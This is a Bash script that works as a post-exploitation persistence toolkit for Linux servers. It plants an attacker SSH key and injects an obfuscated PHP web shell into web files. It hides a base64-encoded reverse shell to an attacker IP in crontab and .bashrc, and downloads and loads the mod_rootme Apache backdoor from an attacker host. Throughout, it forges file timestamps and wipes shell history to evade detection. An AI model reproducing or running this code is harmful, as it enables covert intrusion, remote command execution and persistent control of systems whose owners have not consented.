#!/bin/bash

# param $1 : parameter name
# param $2 : function name
invalid_parameter(){
    echo "[!] Invalid parameter $1 for the function $2"
}

# param p : public key
ssh_backdoor(){
    while getopts "p:" OPTION; do
        case $OPTION in
        p)
            local pub_key="$OPTARG"
            ;;
        *)
            invalid_parameter("$OPTION", "${FUNCNAME[0]}")
            exit 1
            ;;
        esac
    done

    if [ -z "${pub_key}" ]; then
        echo "[-] Can't put the ssh backdoor withtout public key !"
        exit 1
    fi

    # pub key regex from https://github.com/nemchik/ssh-key-regex
    if [[ "$pub_key" =~ ^(ssh-dss AAAAB3NzaC1kc3|ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNT|sk-ecdsa-sha2-nistp256@openssh.com AAAAInNrLWVjZHNhLXNoYTItbmlzdHAyNTZAb3BlbnNzaC5jb2|ssh-ed25519 AAAAC3NzaC1lZDI1NTE5|sk-ssh-ed25519@openssh.com AAAAGnNrLXNzaC1lZDI1NTE5QG9wZW5zc2guY29t|ssh-rsa AAAAB3NzaC1yc2)[0-9A-Za-z+/]+[=]{0,3}(\s.*)?$ ]]; then
        local current_date=$(date -r ~/.ssh/authorized_keys '+%Y%m%d%H%M')
        echo $pub_key >> ~/.ssh/authorized_keys
        chmod 700 ~/.ssh
        chmod 600 ~/.ssh/authorized_keys
        # Hide the modified time
        touch -t ${current_date} ~/.ssh/authorized_keys
        echo "[+] ssh public key added."
    else
        echo "[-] The ssh public key doesn't respect the format !"
        exit 1
    fi

    exit 0
}

# switch param a : poison all php files
# switch param n : create new php file
php_backdoor(){
    # Payload that allows you to send your cmd through the HTTP_CMD header.
    local payload='<?php if(isset($_SERVER[base64_decode('"'"'SFRUUF9DTUQ='"'"')])){echo base64_decode('"'"'PHByZT4='"'"').shell_exec($_SERVER[base64_decode('"'"'SFRUUF9DTUQ='"'"')]).base64_decode('"'"'PC9wcmU+'"'"');}?>'

    local poison_all=1
    local new_file=1

    while getopts "an" OPTION; do
        case $OPTION in
        a)
            poison_all=0
            ;;
        n)
            new_file=0
            ;;
        *)
            invalid_parameter("$OPTION", "${FUNCNAME[0]}")
            exit 1
            ;;
        esac
    done

    if [ "${poison_all}" -eq 0 ]; then
        find /var/www/html -type f -name *.php -writable -exec sh -c "echo $payload >> {}" \; 2>/dev/null
        echo '[+] Every php files in /var/www/html now have a backdoor.'
    else
        # Select a random writable php file from /var/www/html
        local random_file=$(find /var/www/html -type f -name *.php -writable 2>/dev/null |sort -R |tail -n1)
        local current_date=$(date -r ${random_file} '+%Y%m%d%H%M')
        echo $payload >> $random_file
        # Hide the modified time
        touch -t ${current_date} ${random_file}
        echo "[+] File $random_file modified. RCE through HTTP_CMD command."
    fi

    if [ "${new_file}" -eq 0 ]; then
        local file_name=$(echo $RANDOM |md5sum |head -c 10; echo;)
        local picked_file_path=$(find /var/www/html -type f -name *.php -writable 2>/dev/null |sort -R |tail -n1)
        local file_path="${picked_file_path%/*}/${file_name}.php"
        local current_date=$(date -r ${picked_file_path} '+%Y%m%d%H%M')
        echo $payload >> $file_path
        # Hide the modified time
        touch -t ${current_date} ${file_path}
        echo "[+] File $file_path created. RCE through HTTP_CMD command."
    fi

    exit 0
}

# param i : ip address of the attacker
# param p : port of the attacker
cron_backdoor(){
    while getopts "i:p:" OPTION; do
        case $OPTION in
        i)
            if [[ "$OPTARG" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$  ]]; then
                local ip_address="$OPTARG"
            else
                echo "[-] The $OPTION parameter has not the right format !"
                exit 1
            fi
            ;;
        p)
            if [ "$OPTARG" -gt 0 ] && [ "$OPTARG" -lt 65536 ]; then
                local port="$OPTARG"
            else
                echo "[-] The $OPTION parameter has not the right format !"
                exit 1
            fi
            ;;
        *)
            invalid_parameter("$OPTION", "${FUNCNAME[0]}")
            exit 1
            ;;
        esac
    done

    if [ -z "${ip_address}" ] || [ -z "$port" ]; then
        echo "[-] Ip address and port should be set to put a reverse shell !"
        exit 1
    fi

    local b64_payload=$(echo "bash -i >& /dev/tcp/${ip_address}/${port} 0>&1" |base64)
    local CT=$(crontab -l)
    CT=$CT$'\n2 * * * * echo '"'${b64_payload}' |base64 -d | bash -c"
    # use carriage return to hide info in the crontab
    printf "$CT\rno crontab for $USER\n" | crontab -

    echo "[+] Reverse shell hidden inside crontab point to ${ip_address}:${port}."

    # Now hide from the command line using a bash alias
    local current_date=$(date -r ~/.bashrc '+%Y%m%d%H%M')
    echo -e 'crontab(){\n  case "$*" in\n    (*-l*) command crontab "$@" | grep -v "'"${b64_payload}"'" ;;\n    (*) command crontab "$@" ;;\n  esac\n}' >> ~/.bashrc
    source ~/.bashrc
    # Hide the modified time
    touch -t ${current_date} ~/.bashrc

    echo '[+] Crontab hidden to that user by putting an alias on crontab to hide it.'

    exit 0
}

# To run this command, you need to first compile the mod_rootme from https://github.com/sajith/mod-rootme
# Then you need to share it through a simple http server on your machine
# param i : ip address of the attacker
# param p : port where the attacker share the lib
apache_mod_rootme(){
    local file_name='mod_rootme.so'

    while getopts "i:p:" OPTION; do
        case $OPTION in
        i)
            if [[ "$OPTARG" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$  ]]; then
                local ip_address="$OPTARG"
            else
                echo "[-] The $OPTION parameter has not the right format !"
                exit 1
            fi
            ;;
        p)
            if [ "$OPTARG" -gt 0 ] && [ "$OPTARG" -lt 65536 ]; then
                local port="$OPTARG"
            else
                echo "[-] The $OPTION parameter has not the right format !"
                exit 1
            fi
            ;;
        *)
            invalid_parameter("$OPTION", "${FUNCNAME[0]}")
            exit 1
        esac
    done

    local url_download="http://${ip_address}:${port}/${file_name}"
    curl ${url_download} -o /tmp/${file_name} || wget ${url_download} -O /tmp/${file_name}

    cp /tmp/${file_name} /usr/lib/apache2/modules/.
    rm -f /tmp/${file_name}

    # Append to file only if exists
    local current_date=$(date -r /etc/apache2/apache2.conf '+%Y%m%d%H%M' || date -r /etc/httpd/conf/httpd.conf '+%Y%m%d%H%M')
    echo 'LoadModule rootme_module /usr/lib/apache2/modules/mod_rootme.so' | dd conv=nocreat of=/etc/apache2/apache2.conf
    echo 'LoadModule rootme_module /usr/lib/apache2/modules/mod_rootme.so' | dd conv=nocreat of=/etc/httpd/conf/httpd.conf
    # Hide the modified time
    date -r /etc/apache2/apache2.conf '+%Y%m%d%H%M' && touch -t ${current_date} /etc/apache2/apache2.conf || touch -t ${current_date} /etc/httpd/conf/httpd.conf
    echo "[+] mod_rootme installed. Become root by doing a netcat then 'get root'."
}

# param i : ip address of the attacker
# param p : port of the attacker
user_bashrc(){
    while getopts "i:p:" OPTION; do
        case $OPTION in
        i)
            if [[ "$OPTARG" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$  ]]; then
                local ip_address="$OPTARG"
            else
                echo "[-] The $OPTION parameter has not the right format !"
                exit 1
            fi
            ;;
        p)
            if [ "$OPTARG" -gt 0 ] && [ "$OPTARG" -lt 65536 ]; then
                local port="$OPTARG"
            else
                echo "[-] The $OPTION parameter has not the right format !"
                exit 1
            fi
            ;;
        *)
            invalid_parameter("$OPTION", "${FUNCNAME[0]}")
            exit 1
            ;;
        esac
    done

    if [ -z "${ip_address}" ] || [ -z "$port" ]; then
        echo "[-] Ip address and port should be set to put a reverse shell !"
        exit 1
    fi

    local b64_payload=$(echo "bash -i >& /dev/tcp/${ip_address}/${port} 0>&1" |base64)
    local current_date=$(date -r ~/.bashrc '+%Y%m%d%H%M')
    echo "echo '${b64_payload}' |base64 -d |bash -c" >> ~/.bashrc
    # Hide the modified time
    touch -t ${current_date} ~/.bashrc
    echo '[+] Reverse shell installed in the .bashrc file.'
}

# Main

# Finally remove all the commands in the history
cat /dev/null > ~/.bash_history && history -c && history -w && unset HISTFILE
